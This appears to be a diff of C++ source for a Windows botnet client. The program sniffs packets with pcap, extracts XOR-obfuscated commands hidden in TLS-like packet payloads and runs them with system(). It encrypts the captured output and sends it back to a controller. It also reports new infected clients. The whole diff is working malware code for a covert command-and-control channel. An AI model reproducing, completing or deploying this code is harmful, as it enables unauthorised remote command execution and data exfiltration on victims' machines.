@@ -124,15 +124,16 @@ std::string find_curr_dir();
 int startup_finder();
 int size_of_list(pcap_if_t*  list);
 pcap_t* get_handle(pcap_if_t** first_device);
-void decapsulate(const u_char *data, int size);
+int decapsulate(const u_char *data, int size, int id_num);
 pcap_if_t* capture_em_packets();
 void get_mac(mac_values** values);
 void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses);
 void get_ip(std::vector<std::string>& ip_addresses);
 int send_packet(std::string address, std::string mac_addr, std::string option, int id_num);
 int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num);
-int add_to_net();
+int add_to_net(std::string address, std::string mac_addr);
 int command_check(std::string command);
+void send_clients(std::string address, std::string mac_addr);
 
 /*
  *This is the capture thread
@@ -171,14 +172,15 @@ DWORD WINAPI capture(PVOID pPARAM) {
 
 	//free dev list
 	pcap_freealldevs(device);
-
+	int packet_id = 0;
 	//capture packets on dev
 	/////////infinite loop need to change///////////
 	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {
-
+		
 		//inspect packet
 		if (pktHeader->len > 0) {
-			decapsulate(pkt_data, pktHeader->caplen);
+			
+			packet_id = decapsulate(pkt_data, pktHeader->caplen, packet_id);
 		}
 	}
 	///////////////////////////////////////////////
@@ -204,9 +206,28 @@ int main()
 
 	InitializeCriticalSection(&HandleLock);
 	//check file to see if data bot has sent itself to other clients yet
-	add_to_net();
+	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
+	get_mac(&values);
+	std::string mac_address = "";
+	char byte[4];
+	_itoa_s(values->value0, byte, 16);
+	mac_address = mac_address + byte + ':';
+	_itoa_s(values->value1, byte, 16);
+	mac_address = mac_address + byte + ':';
+	_itoa_s(values->value2, byte, 16);
+	mac_address = mac_address + byte + ':';
+	_itoa_s(values->value3, byte, 16);
+	mac_address = mac_address + byte + ':';
+	_itoa_s(values->value4, byte, 16);
+	mac_address = mac_address + byte + ':';
+	_itoa_s(values->value5, byte, 16);
+	mac_address = mac_address + byte;
+	free(values);
 	
-	//trying the multithreaded prog
+	std::vector<std::string> ip_addresses;
+	get_ip(ip_addresses);
+
+	add_to_net(ip_addresses[0], mac_address);
 	DWORD id;
 	HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
 	//HANDLE hSender = CreateThread(NULL, 0, command_console, (PVOID)2, 0, &id);
@@ -225,7 +246,7 @@ int main()
  *client has sent itself to the botnet yet
  *return: always returns 0
  */
-int add_to_net() {
+int add_to_net(std::string address, std::string mac_addr) {
 	std::ifstream myfile("clients.txt");
 	if (myfile.is_open()) {
 		while (!myfile.eof()) {
@@ -240,7 +261,9 @@ int add_to_net() {
 				for (int i = 0; i < 17; i++) {
 					mac_address[i] = mac_address[i];
 				}
-				std::string command = bytes[0] + " " + mac_address;
+				//address of client running this code
+				std::string command = address + " " + mac_addr;
+				
 				//encrypt command
 				int command_len = command.length();
 				for (int i = 0; i < command_len; i++) {
@@ -284,6 +307,47 @@ int command_check(std::string command) {
 		}
 	}
 	return 0;
+}
+
+/*
+ *This function will send the server any new clients
+ *return: nothing
+ */
+void send_clients(std::string address, std::string mac_addr) {
+	std::ifstream myfile("add_to_net.txt");
+	if (myfile.is_open()) {
+		while (!myfile.eof()) {
+			std::string line;
+			getline(myfile, line);
+			int line_len = line.length();
+			if (line_len > 30) {
+				std::vector<std::string> bytes;
+				split(line, ' ', bytes);
+				int id_num = rand() % 7000;
+				std::string mac_address = bytes[1];
+				//remove newline
+				for (int i = 0; i < 17; i++) {
+					mac_address[i] = mac_address[i];
+				}
+				std::string command = bytes[0] + " " + mac_address;
+				
+				//encrypt command
+				int command_len = command.length();
+				for (int i = 0; i < command_len; i++) {
+					command[i] = command[i] ^ 'H';
+				}
+				connected_mode_send(address, mac_addr, "1", command, id_num);
+			}
+		}
+		myfile.close();
+	}
+	//write over file
+	std::ofstream outfile;
+	outfile.open("add_to_net.txt", std::ofstream::out);
+	if (outfile.is_open()) {
+		outfile << "added";
+		outfile.close();
+	}
 }
 
 /*
@@ -541,7 +605,7 @@ pcap_t* get_handle(pcap_if_t** first_device) {
 *and call functions if needed
 *renturns nothing
 */
-void decapsulate(const u_char *data, int size) {
+int decapsulate(const u_char *data, int size, int id_num) {
 	eth_header* eth_hdr;
 	eth_hdr = (eth_header*)data;
 	IPv4* ih;
@@ -549,6 +613,7 @@ void decapsulate(const u_char *data, int size) {
 	tcp_head* th;
 	tls_header* tls_head;
 	udp_header* uh;
+	int identification_number = 0;
 	//u_short sport;
 	//u_short dport;
 
@@ -593,87 +658,104 @@ void decapsulate(const u_char *data, int size) {
 
 			//assume there is layer three data
 			if(total_packet_length > 0){
-				int identification_number = ((ih->identification & 0xFF) << 8) | ((ih->identification >> 8) & 0xFF);
-
-				//get tcp header
-				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
-				th = (tcp_head *)((u_char*)ih + head_len);
-
-				std::cout << "Flags: " << (int)th->flag << std::endl;
-				//check control bit number for ack-psh packet
-				if ((int)th->flag == 24) {
-					//decapsulate TLS header
-					tls_head = (tls_header *)((u_char*)th + 20);
-
-					//have to flip bits because of memory type
-					if (tls_head->type == 23) {
-						//std::cout << tls_head->length << std::endl;
-						//int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
-						u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
-						std::string command; //string that will contain command used
-						int tls_data_len = tls_head->length - 7;
-						for (int i = 0; i < tls_data_len; i++) {
-							//get data
-							command = command + (char)*data_char;
-							//increment
-							data_char = data_char + 1;
-						}
-						
-						//decrypt command
-						int com_len = command.length();
-						for (int i = 0; i < com_len; i++) {
-							command[i] = command[i] ^ 'H';
-						}
-						//std::cout << command << std::endl;
-						if (command_check(command) == 0) {
-							//run command
-							command = command + " > test.txt";
-							int return_val = system(command.c_str());
-							//read output from file
-							std::string result;
-							std::ifstream myfile("test.txt");
-							if (myfile.is_open()) {
-								while (!myfile.eof()) {
-									std::string line;
-									getline(myfile, line);
-									result = result + line;
-								}
-								myfile.close();
-							}
-							//encrypt result
-							int res_len = result.length();
-							for (int i = 0; i < res_len; i++) {
-								result[i] = result[i] ^ 'H';
-							}
-							//std::cout << result.length() << std::endl;
-							//add check for new clients here
-
-							//return result to server
-							identification_number++;
-							connected_mode_send(address, mac_address, "1", result, identification_number);
-						}
-					}
-				}
-
-			}
-			else {
-				int identification_number = ((ih->identification & 0xFF) << 8) | ((ih->identification >> 8) & 0xFF);
-				//length 6 is reserved for ack packets
-				//on botnet communication to complete handshake
-				if (ip_header_length > 6) {
-					std::cout << ip_header_length << std::endl;
-					std::cout << "IP Address " << address << std::endl;
+				identification_number = ((ih->identification & 0xFF) << 8) | ((ih->identification >> 8) & 0xFF);
+				std::cout << "identification" << identification_number << std::endl;
+				std::cout << "id num" << id_num << std::endl;
+				if(identification_number != id_num){
 					//get tcp header
 					head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 					th = (tcp_head *)((u_char*)ih + head_len);
 
-					//check control bit number for syn packet
-					if ((int)th->flag == 2) {
-						//send syn ack
-						identification_number++;
-						send_packet(address, mac_address, "1", identification_number);
-					}
+					//std::cout << "Flags: " << (int)th->flag << std::endl;
+					//check control bit number for ack-psh packet
+					if ((int)th->flag == 24) {
+						//decapsulate TLS header
+						tls_head = (tls_header *)((u_char*)th + 20);
 
+						//tls application data type
+						if (tls_head->type == 23) {
+							std::cout << "tls data" << std::endl;
+							//int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
+							u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
+							std::string command; //string that will contain command used
+							int tls_data_len = tls_head->length - 7;
+							for (int i = 0; i < tls_data_len; i++) {
+								//get data
+								command = command + (char)*data_char;
+								//increment
+								data_char = data_char + 1;
+							}
+						
+							//decrypt command
+							int com_len = command.length();
+							for (int i = 0; i < com_len; i++) {
+								command[i] = command[i] ^ 'H';
+							}
+							//std::cout << command << std::endl;
+							//check for client ip and mac
+							if (command_check(command) == 0) {
+								//run command
+								command = command + " > test.txt";
+								int return_val = system(command.c_str());
+								//read output from file
+								std::string result;
+								std::ifstream myfile("test.txt");
+								if (myfile.is_open()) {
+									while (!myfile.eof()) {
+										std::string line;
+										getline(myfile, line);
+										result = result + line;
+									}
+									myfile.close();
+								}
+								//encrypt result
+								int res_len = result.length();
+								for (int i = 0; i < res_len; i++) {
+									result[i] = result[i] ^ 'H';
+								}
+								//std::cout << result.length() << std::endl;
+								//add check for new clients here
+								send_clients(address, mac_address);
+								//return result to server
+								identification_number++;
+								connected_mode_send(address, mac_address, "1", result, identification_number);
+								return identification_number;
+							}
+							else {
+								std::cout << identification_number << std::endl;
+								return identification_number;
+							}
+						}
+					}
+				}
+				else {
+					return id_num;
+				}
+			}
+			else {
+				identification_number = ((ih->identification & 0xFF) << 8) | ((ih->identification >> 8) & 0xFF);
+				if (identification_number != id_num) {
+					//length 6 is reserved for ack packets
+					//on botnet communication to complete handshake
+					if (ip_header_length > 6) {
+						/*std::cout << ip_header_length << std::endl;
+						std::cout << "IP Address " << address << std::endl;*/
+						//get tcp header
+						head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
+						th = (tcp_head *)((u_char*)ih + head_len);
+
+						//check control bit number for syn packet
+						if ((int)th->flag == 2) {
+							//send syn ack
+							identification_number++;
+							send_packet(address, mac_address, "1", identification_number);
+							return identification_number;
+						}
+
+					}
+				}
+				else {
+					return id_num;
 				}
 			}
 		}
@@ -718,6 +800,7 @@ void decapsulate(const u_char *data, int size) {
 		}		
 
 	}
+	return identification_number;
 }
 
 /*
